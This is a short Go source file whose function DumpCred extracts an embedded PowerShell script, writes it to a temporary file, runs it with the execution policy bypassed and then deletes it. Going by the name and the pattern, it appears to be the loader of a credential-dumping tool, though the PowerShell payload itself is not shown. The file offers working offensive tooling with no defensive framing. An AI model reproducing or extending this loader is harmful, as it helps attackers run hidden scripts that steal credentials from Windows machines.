package pack

import (
	"embed"
	"fmt"
	
	"io/ioutil"
	"os"
	"os/exec"
)

//go:embed code.ps1
var content embed.FS

func DumpCred() {
	// Read the PowerShell script content from the embedded file
	psScriptPath := "temp.ps1"
	psScript, err := content.ReadFile("code.ps1")
	if err != nil {
		fmt.Println("Error reading embedded PowerShell script:", err)
		return
	}

	// Create a temporary file to save the PowerShell script
	err = ioutil.WriteFile(psScriptPath, psScript, 0644)
	if err != nil {
		fmt.Println("Error writing PowerShell script to file:", err)
		return
	}
	defer os.Remove(psScriptPath)

	// Execute the PowerShell script using the "powershell" command
	cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-File", psScriptPath)
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Error running PowerShell script:", err)
		fmt.Println("Output:", string(output))
		return
	}

	fmt.Println("PowerShell script executed successfully.")
}
